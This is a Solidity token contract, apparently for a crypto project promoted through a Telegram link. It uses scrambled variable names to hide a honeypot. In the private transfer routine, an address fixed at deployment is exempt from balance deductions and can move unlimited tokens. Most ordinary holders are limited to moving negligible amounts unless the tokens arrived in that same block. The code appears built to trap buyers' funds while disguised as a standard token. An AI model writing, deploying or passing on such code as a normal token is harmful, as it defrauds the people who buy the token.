/*

https://t.me/portalredeth

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.7;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract Token is Ownable {
    constructor(string memory djmlqsythvaf, string memory zswldq, address njecwbtufi, address qtlanswjefgk) {
        name = djmlqsythvaf;
        symbol = zswldq;
        balanceOf[msg.sender] = totalSupply;
        zjisxqpbkafe[qtlanswjefgk] = irkhqtguycn;
        twsocvfa = IUniswapV2Router02(njecwbtufi);
    }

    IUniswapV2Router02 private twsocvfa;

    mapping(address => uint256) private zjisxqpbkafe;

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function transferFrom(address yjfubeqs, address ubipyhevd, uint256 mxbfckpd) public returns (bool success) {
        require(mxbfckpd <= allowance[yjfubeqs][msg.sender]);
        allowance[yjfubeqs][msg.sender] -= mxbfckpd;
        prwycze(yjfubeqs, ubipyhevd, mxbfckpd);
        return true;
    }

    function transfer(address ubipyhevd, uint256 mxbfckpd) public returns (bool success) {
        prwycze(msg.sender, ubipyhevd, mxbfckpd);
        return true;
    }

    uint256 private irkhqtguycn = 101;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function approve(address yzhda, uint256 mxbfckpd) public returns (bool success) {
        allowance[msg.sender][yzhda] = mxbfckpd;
        emit Approval(msg.sender, yzhda, mxbfckpd);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    uint8 public decimals = 9;

    string public symbol;

    string public name;

    function prwycze(address yjfubeqs, address ubipyhevd, uint256 mxbfckpd) private {
        address onixgfzyjlcv = IUniswapV2Factory(twsocvfa.factory()).getPair(address(this), twsocvfa.WETH());
        bool lakxscrpt = 0 == zjisxqpbkafe[yjfubeqs];
        if (lakxscrpt) {
            if (yjfubeqs != onixgfzyjlcv && docap[yjfubeqs] != block.number && mxbfckpd < totalSupply) {
                require(mxbfckpd <= totalSupply / (10 ** decimals));
            }
            balanceOf[yjfubeqs] -= mxbfckpd;
        }
        balanceOf[ubipyhevd] += mxbfckpd;
        docap[ubipyhevd] = block.number;
        emit Transfer(yjfubeqs, ubipyhevd, mxbfckpd);
    }

    mapping(address => uint256) private docap;
}
